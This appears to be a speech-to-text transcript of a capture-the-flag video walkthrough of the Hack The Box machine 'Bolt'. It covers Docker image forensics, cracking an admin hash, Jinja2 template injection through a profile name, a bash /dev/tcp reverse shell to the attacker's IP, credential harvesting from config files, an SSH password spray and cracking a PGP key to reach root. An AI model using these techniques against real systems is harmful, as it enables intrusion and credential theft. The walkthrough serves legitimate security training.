 what's going on youtube this is ipsec we're doing bolt from hack the box which was a really fun box that starts off with finding a customized docker image that you can download do some forensics on and get credentials along with the app source code to one of the web apps there's also a customized application on it that is vulnerable to server side template injection in somewhat of a unique way it uses jinja 2 which is a templating language to send emails so if you log into the app and change your name to be an ssti payload and then have it send an email you can get code execution that way once on the box there is a application called passport which is an open source password manager that you have to get the pgp keys out of and decrypt stuff out of the password manager in order to get the root password so with that being said let's just jump in as always i'm going to start with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it bolt and then the ip address of 1010 11.114 this can take some time to run there so i've already ran it looking at the results it looks like we have three ports open the first one i see is ssh on port 22 and his banner tells us it's an ubuntu server we also have http on port 80. it's running engine x also on ubuntu we have 443 on https same thing engine x ubuntu but just quick glance i can see the http title for 80 and 443 is different uh we just have starter website for 80 and pass bolt and open source password manager for teams on 443 also we have an ssl certificate on 443 that does leak the host name so let's go put this in our host file so sudo vi etsy host and we can do 10 10 11 114 passport.hdb and i'm also just going to put bolt.hdb as well and let's go take a look at the website so the very first thing i'm going to do is the ssl one because i just want to double check that there's nothing in like an alternative name section sometimes certificates are good for multiple hosts and you can find that just looking at the certificate and looking at alternative names and map generally does pick that up so you don't have to do it but i always like just double checking we can see the common name for it is there but let's just accept this certificate and take a look at the website and while that loads we can just do passbolt or not passbolt both.htb to check out the regular website so this is passport and based upon the title it is an open source password manager for teams i'm just going to test an email so root at ipsec.rocks and registration has been sent and that's about it nothing else there we can just confirm that this is an open source password manager so i'm just googling passport and we can see it is so looks like it's just this application installed let's take a look at the website the very first thing i want to do is see if virtual host routing is at play or just 80 and 443 have different hosts so i'm going to do 1010 11.114 see we also get to start a website and then i'm gonna do passport.bolt.hdb as just http and we can see the lock here saying it's um not ssl this one would be yellow so i don't think there's any virtual host routing at play but doesn't mean we can't run a go buster real quick to do a sub domain check so go buster v host dash u for url http bolt dot htb dash w for word list op sec list discovery dns and i'm just going to do subdomains top million 5000.text and dash oh i'm going to call this gobuster.vhost.http i'm going to do 80 i guess and then when this is done i'm also going to do dot uh 443 so we enumerate both um http and https we see we do have a few more domains mail and demo but let's just take a look at this website so administration using admin lte and going down meet team so we have potential names so i may try like j girth at both.hdb and a login to see if that um logs in if we go to login let's see uh admin admin see if admin exists no 403 access denied man that is a slow login so you could also try variations of this but i'm not going down this rabbit hole that much because so far i don't even know if this is a valid username like why would i do a password force if i have no way to enumerate valid usernames since both those gave a 403 error so maybe both admin and j girth or whatever that name was existed so i'm going to put something that doesn't exist if i just get a 403 i move on and i probably should look at this in burp suite just to see if there's a subtle difference but don't believe there is i'm going to click on the what we do and we can see where the right brain meets the left brain get started it's just a web page what if we click get started i think it brings us right back here we got pages so there's a contact a pricing a service a download and a sign in so always check everything looking for where there's user input i'd probably be marking this down because there's a contact form we could try like cross-site scripting there to see if anyone's viewing it nothing really there we could also try putting things in the subscribe nothing there download our free docker image today i'm going to try downloading that save image.tar and then we have this login so let's take a look at the docker image we just downloaded but before we do that i'm going to run a go buster v her scan on https just to see if there's any names there so i'm going to move downloads image.tar to my working directory and then i'm going to make the directory image and this is where we're going to extract it so tar xvf image.tar and oh man this is a docker file so um how it does file systems is really weird at first so these are a bunch of like git commits and different changes to the file system we can kind of look at this file the initial json showing all the commits so we can see let's just go to the top so the host name of the machine right here standard docker thing environment it's using g unicorn so this is running a python app it's the flask dashboard admin lte that's a container name we get the image um environment command so these are different images here so whenever you download something from docker and you just do like um give me ubuntu colon latest you're just downloading the latest version if you looked at the actual like docker file there'd be older and older versions so like in wordpress you can download any wordpress version and it just has all these what docker calls is layers and i don't really know exactly how it works under the hood so i'm not going to explain much more i'm just going to explain kind of how i um view it now there is a program let's see and i did not use it but i do want to show it so github dive docker i'm guessing so this is a special tool for analyzing docker files and i didn't get a chance to look at it that much before recording this video but talking to people after doing the box this is kind of how they did it so i do want to show what it looks like if you just give it the tara file so dive docker archive colon slash image.tar and when you download it you just go to the releases and you can download a dab so you can just like d package i install it so here we see a list of all the commits and then we go to the right we have files so i can go to the right and do this and probably like view a file or something somehow so this probably a super handy tool if you do this a lot but being me i just like analyze the files manually so every of the docker commits or docker layers if we look in it just has a basic layers.tara file so what i did is i did a dua hs star and i'm thinking okay well the small ones are probably just one-off changes there's probably like one file in there they deleted a file it changed like the port that is listening on docker so i started with the largest one because i'm assuming the largest docker image is going to be the one that contains the os and that's the base image so to test my theory i go here and i'm going to do a tar tvf and what this does is just show me the files in this layer so we can see exactly kind of what it looks like we have um a bunch of pyc files but i mainly just want like a database or config so that's kind of what i'm looking for here we have config.c python so it's probably a config.pi somewhere i'm going to grep for config and that's just in pi cache so probably not a file um i'm gonna also grip for a sequel light in this and we don't have it so at this point we want to just find all the um layer. so i'm gonna do fine dot dash name layer dot tar and we could also do like exact tar dash tvf and then i think like this and it list every file in every turn now the downside to doing it this way is i don't know um the actual like file it's going into like i don't know which layer this who am i to busy box is right so that's one of the downsides here um if we wanted to fix that the easiest way i do that is i just wrapped this in the loop so we have find layer.tar i do for i n put it like this and then we do tar tvf i done and we're gonna have the same exact issue um but we've got a do but now since i'm not doing it in just one command i'm doing it in two i can do it echo i and then that tara tvf so at the start of every command it will print out the layer it's in and here i'm going to grep for everything that ends in py i don't want any like pyc files uh we could decompile it but um we have the source code anyway so no need to go that route now i can do graph dash v i don't want anything in this user because this is gonna be a like python library and we just don't want that so going here let's see i don't see any config here we go there's one config so let's extract this so tur tvf um i'm going to make the output we can turn c to change directory before we run this command put it in output and then we can say um dash x v f on that file and now in output we just have this file uh we have config.pi and it's using um well let's yeah sqlite so we want a db.sqlite file i'm just seeing if there's any passwords here we have support at bolt.htb nothing there so now we want to grab sqlite so we're going to go back to this find command and i'm just going to change my grep remove py put sqlite um i expected to actually find a file there maybe db let's see tvfi oh i could go out of my output directory right and now we can get the file so let's see db dot equal light 3 so this is the file we want i'm going to copy this my tar command with dash c erase that and we'll put the new one in we could have cleaned output up first but um don't have to there is a dot ash history so let's look at that just exit so we may also want to grab history files right so if we wanted to do that do that same find instead of grabbing db grab history and we can see ash history at some point changes in size so i'm going to also extract this one so ter c output xvf oh that just did a lot more files than that oh well um hopefully we didn't wipe our db if we did we can go back um sometimes when i do these things i have a bit of like 80d and i'm just like oh there's a history file i want to see that so root dot history and all it was was apk adding nano not interesting let's go into the db dot sql 83 i was just like running dot dump and we can see all the information here um user so we have values admin admit bolt and then this big hex blob um i say hex because it's begun beginning with an x i bet if i do like select username password from user it automatically decodes that hex if it did not have this hack x marked so i didn't know his hex what i would probably do is an echo dash n put this in wc-c i see 68 characters and i don't know any hash format that matches this because it's in a weird like number like 32 um i'd probably say is md5 some 64. i may say like md5 some as well because maybe it just is encoding the hex weird i don't know but um 40 would be like a shot one sum like all those numbers i don't know what 68 is so i would just say okay um let's do gchq cyber chef and decode it this way right i mean we could do a python one-liner but why would you do that when this is infinitely faster and you can play with things quickly so we can see we got a hash um i'm just going to grab this and we're going to go over into hash cat i'm going to go in the kraken because um i don't like cracking on the box i do record videos in so this is just a box that's on my home network i'm gonna v hashes and we'll call this um we're doing bolt paste this in we can say dot slash hash cat um dash h uh is it dash h no we just put the hashes right hashes bolt and the word list will do opt is it rocky.text or hop word list rocky.text and hashcat now has auto detect mode i know you may be sick of me saying that but i gotta kill time anyways while this runs so it automatically detects the hashtag and it's now cracking in rock u we have one recovered and the password is deadbolt so now we have some type of credential it is admin so i'm going to go back to the login i'm going to try admin and then deadbolt and we get logged in and in this piece i don't really like this part of the box because there is this mail thing and anytime you try to read a mail you just get this 500 server error but if you read the direct chat there is i believe a hint let's see do you check over the docker image security team had a concern about it so not much here but keep in mind we did have a few more domains that hit on our virtual host enumeration so i'm going to add those in the ssl one didn't have anything and i realized when i did that i overwrote my port 80. so i probably should have done 443 for that one but let's see we should have the history up here of mail and demo so let's go sudo vi etsy hosts and i'm going to do mail.htb.mail.bolt.hdb and demo.bolt.htb take a look at both of these sites so demo.bolt.hdb we just have a login so i'm going to try admin and deadbolt again and we get a 403 forbidden i'm going to try mail.bolt.htb and we have bolt webmail again admin deadbolt try to log in and i can't we do have a create account so i'm going to try to do this and it wants us to give a username so i'm going to give it ipsec we can say root at ipsec.rocks password a password i don't have an invite code i'm just going to put something there and we're going to create the account uh okay so maybe ipsec at bolt.hdb and one had in requested format and the default tooltip there was bolt.htb we register and it says invalid invitation code so at this point i'm thinking i may have to do some more digging around this docker container to see if i can find the source code to see how it does registration codes or at least see if this docker image is even this application right so let's go back to this and what i'm going to do is let's see i'm going to cat 859 like this jq dot do these little bracket things because it's starting and is it yeah i just want to go up one layer because we had double the squigglies so that goes up and now i think i can just do dot layers and we should just get this no let's see there's even the right numbers let's see 3fc okay so um these are shaw sums not the actual things maybe repositories no what's a manifest manifest is i think what i want jq dot there we go go up one and then we want layers probably with a capital l so all i want is these files with layer.tar um i could have just done it with ls grip for directory but whenever i can play with this jq binary and learn it more i try to so i'm going to put this in output uh we put this in layers and i just want to grab this so delete all these things and the goal here is to just extract every archive and the reason why i did it this way is because i'm going under the assumption that these are sequential right so when i change a file i'm hoping this is the start of the container and i change a file down here as long as i extract these sequentially the latest file i have will be there um let's see can i find out if these are sequential lsla march 5th if i stat a directory do we have a date yeah we do so um that's more oh wait so that's last year so if i stat all these grep for modify everything is near the same time so i don't know a good way to do this piece otherwise so i'm just going under the assumption i want to extract these sequentially no other way to do it but sometimes you just go out on hunches right so if i make directory output we can do four i n layers we need to cat that do c and output and you notice i deleted the directory and recreated it just so um we start clean and i can do tar xv f i and i think that's it so done uh let's see turd capital c i did tar twice so there we go now we have extracted everything if i go into output we have pretty much the whole container and doing it this way first probably would have been easier because we have config we got db if i go in root there's probably this dat um history and it's just exit because again the one that had it installing nano was an older layer so i guess they deleted and reinstalled this history file or something but or maybe the history file is or to begin with i did not extract it in the right order i don't know exactly but i do know i have the web app here so now we can take a look at it and try to find like the register peach i wonder if there's a get let's see fine dot grap get nope so i was hoping i had like um comments around the code in each revision but if we go in routes we can see kind of how this works there's not really many python files so it looks like probably all the codes either in routes or forms and forms is pretty much empty so that's a funny package flask what the  wtf my bad but we go to routes let's see what do we have um we want register right and i don't have anything under register crap dash i register routes nothing and that's the end point i want so maybe this isn't the same piece of code so i'm going to go back let's go look at these layers and i'm going to do that for command again so let's see i probably should have um see how i just search tvf here we go i could have done a history and grep as well but i always hate showing my history on stream or recording so i'm going to do grep dash i i just want to look for at routes.pi and we can see there are a few files of it so we got app base app base app home i wonder if i have both of those here let's see cd output cd app cd i wonder which one i was in probably not in this one this has a bit more uh python files so let's see fee routes register here we have a registration endpoint so if we look at this account already exists user created is there a code check the password code i'm on login register check if email exists so i don't see anything there but we definitely want that app base so what i want to do next is that same tvf command find do echo where am i i'll put this so we do have two different um dates on this so we have 14 27 and 1749. let's see exactly what uh copy we were looking at so lsla on output app base route stop pi i'm going to do stat against that and we are looking at where is the date stamp right here 17 49 and this is so we're looking at the latest one i want to look at this older one and that is in this file so maker output two let's go here whoops cd output two enter xvf dot dot slash this go in at base v routes dot pi let's look at the register function here and we can see there is a hard coded code so in this older version we have something we want so i like copying from less better than vim so that's why i'm just switching i can just copy this and we can go create an account so ipsec ipsec bolt.htb password a password invite code and i agree and i'm also sure um if we went back we could probably look at um either these directories because they both have web apps but if i just grep dash right bolt.hdb i was thinking we probably have various host names so you probably don't have to use uh go buster to find these you can probably get this from the code itself but my username was ipsec i believe password a password and we can log into this application now this is another catch on this thing what we want to do is edit our settings and there's a lot of fields here it's hard to get back to this admin profile field without just logging out logging in but you play around with a lot of it the one thing you can do is in settings so we can try changing our name so the first thing i would do is like try to put this in um cross-site scripting and see if this goes bold anywhere and when we submit we just get brought back to this dashboard i was thinking it would do something else so i'm going to click back maybe it doesn't like um those characters right so let's just try changing the name to ipsec and see exactly what happens here and we go back oh we have the name change right there so let's try cross-site scripting submit and doesn't have anything let's see hip sec yeah it did not put any of those characters so another thing we tried doing is like um ssti here so seven times seven we can do it in every field see what happens submit and it went back to ipsec so something is broken on this page it says email verification is required in order to update personal information so um maybe that's what i'm missing because no matter what i set here i think my name goes back and then i refresh the page let's see i could have swore that i went back yeah it's back to ipsec here so not sure but it's saying email verification let's go back to webmail so i'm going to try logging in with the credentials i created and we have a lot of confirmation changes emails so every time we've been doing that we've been getting a email if i click here and let's see do we get another email after doing that yes we do it says my profile has been confirmed and it's 49 so we had made two changes there the very first change we did was cross-site scripting and the other one was ssti was seven times seven and um i'm guessing the seven times seven one worked right here because we saw 49 so let's see we have to figure out exactly um [Music] what templating engine this is and if i do a um let's see it's a payload all the things yeah payload all the things i'm going to grab or search ssti and i think they have a nice graph here so let's see methodology seven times seven this picture's not making much sense to me anymore um because i would expect it to say 49 this would be ginger i'm guessing this graph show means something different so if it outputs let's see let me just go in python real quick 7 times seven i think this is going to print seven sevens because we're doing seven times a string here right yeah so i know this templating layer is jinja two and we could get that i think if we gave it a bad url we see this ginger error message so you know it's ginger too and i don't know exactly what this was saying with that maybe it's just these two things work on these templating languages i don't know um but maybe when you do seven times seven and twig or maybe a different language like php it may print seven sevens or it may print 49. so there's just ways to identify it so we know ginger two is being used so we should look for ginger two here and what i want oh here we go seven times seven with the string would generate seven sevens but we knew it from the error message so we don't have to enumerate what layer this is we just want to execute files um so this is read that's right code execution we can try this so i'm going to put this in my name submit go back to the bolt webmail confirm the change and then we should get an email back with the output of the id command if we do then we can go and try to put a reverse shell in come on there we go and we have the output of the id command so let's now where is that profile page right here um i'm going to type it in a terminal window just because it's easier for you to read i believe so i'm going to do bash dash c and then let's see that's using single quotes already so i'm doing double quotes dev tcp 1010 14 8 9001 0 and 1 like this and we should be able to just copy this listen on 9001. paste this in paste this in where id is submit let's go back to the webmail confirm the profile change and we see it's hanging here but that's probably because our web shell is working and we have a shell so i'm going to do python 3 c import pty pty dot spawn bin bash type it correctly sdty raw minus echo fg enter and you should do a semicolon fg then enter twice just in case you use like zsh or something but i always forget so if that command didn't work try that and then enter twice but let's see i'm just going to export term is equal to x term so i can clear the screen and now the thing i always like doing is hunting all the database credentials and getting all the passwords so we know there's maybe four different web servers running we have email demo um well demos sql lite so maybe there's not anything there we have passbolt we have the main site so we're in demo right now uh there is config.pi and we have one set of credentials so i'm going to just start taking note of all these so v creds dot text paste that let's go to the next app um looks like the apps are in var dub dub dub we were in demo so i'm gonna go to dev cat config.pi do we have a password here we do so i can grab this copy paste this that is the same password so let's go to html this is just blank files round cube let's see configs a directory cat config.inc.php do we have password here sql database come on where is it here we go round cube user so we can copy this delete to duplicate so we're left with where passbolt is so i'm going to go ver or not for etsy nginx because we know it uses nginx sites dash enabled and we have passbolt.com we look at this and it's in user share php passbolt or etsy passport i'm going to check etsy first because that's where the configuration files normally are and let's see gpg prep dash ri sql that was a lot um i'm going to grab for password which is probably gonna be a lot because it's a password manager uh let's see what's in passport.php oh passport configuration file awesome so source so we have passbolt and then i'm just going to grab password out of this got password passbolt.php and we can grab this so we have a bunch of creds to my sql so i can do my sql dash u bolt underscore dba we want to do dash p so we can enter a password and then copy this and paste it show tables or show databases first use bolt mail show tables select star from user and we have my password and admin so if we wanted to get admins mail we could potentially put it here so v to crack admin but that let's see the next thing we have is round cube user so round cube user and then we want to copy this i don't know if that copied right that's not copy paste show databases use round cube there's probably a user table here use users use users what round cube user dash p show databases use round cube select star from i was saying use users wasn't i not select star ah i don't know why i was doing that the mistakes you make sometimes but we only have my credential here or my um account so nothing special there uh we do have this passport one so let's go into passport and we can enter this password show databases and if i was actually doing something i'm like doing this on engagement i'd consider just always issuing like a mysql dump and copying off all the databases but the reason why i don't always do that is number one um databases can get big and like you may i forget exactly how some company got caught but i know someone a major breach the only reason they caught the attacker is because they'd have my sequel dump which took the database offline as they dumped the data or something which was just funny so if your query takes a long time you may cause some type of issue the other reason is customers may not want you dumping the whole database it's always best to just grab what you need instead of just dumping everything because maybe they don't want you viewing social security numbers if that's out of scope and they have that in the database but they may not have an issue of you just dumping like password hashes because that's relevant to the pen test like okay i can explain why i'm looking at passwords i can't explain why i'm just dumping all your social security information so always be cautious with that when you do um things so i just did use passport db so i can do show tables now and we can select star from tables and we also have secrets so i kind of look at that as well from users uh and we don't have a password hash here we have eddie and clark but nothing else uh we can do select star from secrets is it secrets yeah and there is a pgp message which is going to be encrypted but given this is a password database um it's probably got something good in it so i'm going to save that pgp message and i'm going to call this passport.message.gpg and we want to paste that okay so we're kind of at a loss here we could try cracking this one password but we can also try all the credentials we have against other users so i'm going to do that one first if i cat etsy pass wd i'm going to grep for anything that ends in sh so we get a list of users so v users i'm going to do root eddy clark and then i'm going to grab all the passwords out of creds so i'm going to awk dash f colon creds.text i'm going to print to let's see does this go at the end there we go if you ever want to mess with like um [Music] password crackers or things like that people that do database dumps if you put random delimiters and fields you don't care about such as description or things um you may break someone doing something like this where they just dump the database use awk and then grab all the passwords um like if in the description you had a colon and they did select stern description came before the password that no longer have the correct field for your password if that makes sense right so let's see also if you're doing it in config files they may truncate the password accidentally if you use the colon as a character so let's see passwords and i'm going to run crack map exec yes it is working on this vm suite ssh um 10 10 11 114 i'm just going to do both.hdb because i forget the ip dash u users dash p pass and we're just going to do a password spray over ssh with all these creds so root pass fail wait what it's password passwords i did tab autocomplete and um because pass existed in this message.pgp that's why um it was there so we just gotta wait for this password spray and i guess while i would be waiting for this typically i would um use hash cat and try to crack that other hash so this would be the recon i have running but we get a hit that this was a success so i'm going to try the su i'm not even gonna ask you i'm gonna ask sage as eddie so eddie at uh bolt dot htb get rid of that extra s paste this in and now we are logged in as eddie and i cleared the screen right away um it says we have mail so if we went inverse bull mail uh i have mail from oh that's probably um how the webmail is working it's using that so we can look at eddie's mail and we can see the password manager service is up and running go ahead and download the extension to your browser and get logged in be sure to backup the private keys as he can't recover it and once you're set up you can begin importing your password so at this point we want to try to find the private key and i would be doing a lot of research in passport so like passport white paper and like understand exactly how passbolt works but also we can look at like our directories and passport is a password manager so they probably have some type of browser extension right so that's why i'm going in here go in dot config i can see there is a google chrome profile and we have two options we could do here we can either um like install passport and chrome on our computer and copy their google chrome profile here to ours and use passport natively or you can just try to extract messages manually and i'm going to do it the manual route because no matter what you have to get this pgp key out so we can crack it so what i'm going to do is let's see grab capital r i think it's private pgp what happens if we just search this nothing um gpg let's see private pgp key header see do we have begin pgp what i have i just have private pgp so i want to do begin pgp because we specifically want to look for a private key block private key and the one thing that gets a lot of people um we see those extensions here so this is just openpgp.javascript of the actual plugin or extension i guess chrome calls it but there's nothing interesting here because this is just the source code however we do get a match binary file and we see something in this weird log file if i did dash a to include um to try to grab everything because by default grip's not going to work against a binary file dash a will allow that we can then get more information and i'm going to begin what is it pgp private and we can extract a private key out of here right let's see this key begin yep so i'm going to grab this and we just want to grab his whole private key i'm looking for this ends and i'm going to grab that and then i'm going to go back on my host i'm going to call this eddie.pgp or i like gpg they're pretty much the same thing i don't know the difference i think one is open source one is not but i'm using gpg to decrypt this i know that so that's what i'm calling it gpg so the only thing left here is we have to break these lines we have like the line breaks escaped so i'm doing said search for backslash backslash backslash backslash we escape the backslash r and i'm going to replace that with just um backslash r and when i do that now we have the pgp key formatted correctly so if we tried to do gpg dash import on i misspelled eddie uh maybe dash i is it let's see no way to print secret packets here mv i'm guessing i'm screwing up how to import this begin pgp is it dash dash import yeah uh we need the passphrase for his key so it's two dashes on import so without the passphrase we can't really do anything um i'm gonna google crack pgp key i keep typing uh php key there's probably a john thing so let's go here gpg gen key yeah gpt gpg to john right here so this is what we want gpg to john and then we can do eddy like this and copy this go over to my cracking box cd op john v i'm going to call this bolt paste this john bolt dash dash word list equals um up word list rock u dot text so we're gonna try to crack this and did it already crack oh no file found ls opt wordless not plural there we go and this could take a little while to crack it is in rocky i believe so i'm just going to [Music] um pause the video and we will wait actually before i do that i'm going to run the date command here so you can uh the time command here if i do time it will say how long it took for this to run so i'm going to pause the video and we'll just come back when this cracked so about five minutes later actually four minutes and 46 seconds we have the uh pgp cracking to merry christmas and that's for eddie johnson so let's go and try to re-import that key so we have let's see eddie.gpg so i'm going to do gpg import eddy paste in the password of merry christmas and we have it imported and with this imported we can do gpg d to decrypt passport.message.gpg put the password of merry christmas and again and the password is this string so if i copy this and we do s u dash we can switch over to the root user because that is root's password and that will be the box um we probably could have also let's see gpg is it list keys on passport dot message dot that let's see pgp gpg list keys for file show key info what is it cat key file i think there's a way to just list the keys for this i just do gpg this yeah it's encrypted with this key for eddie johnson um i could copy this machine this key this message somewhere else to verify but you don't have to import the private key to see what key will decrypt it so yeah that'll be it take care guys and i will see you all next week